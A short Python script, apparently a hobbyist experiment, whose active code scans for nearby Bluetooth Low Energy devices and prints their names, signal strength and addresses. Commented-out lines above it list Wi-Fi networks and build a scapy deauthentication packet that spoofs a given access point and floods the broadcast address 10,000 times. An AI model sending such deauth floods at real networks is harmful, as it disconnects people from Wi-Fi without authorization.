# from wifi import Cell, Scheme
# from scapy.all import *
# cells = list(Cell.all('wlp4s0'))
# for cell in cells:
#     print(cell.address + " " + cell.ssid + ' ' + str(cell.channel))


# brdmac = "ff:ff:ff:ff:ff:ff"
# pkt = RadioTap() / Dot11(addr1=brdmac,
#                          addr2=sys.argv[1], addr3=sys.argv[1]) / Dot11Deauth()

# sendp(pkt, iface='wlp4s0', count=10000, inter=.2)

import asyncio
from bleak import BleakScanner


async def main():
    devices = await BleakScanner.discover()
    for device in devices:
        print(device.name, device.rssi, device.address)

asyncio.run(main())
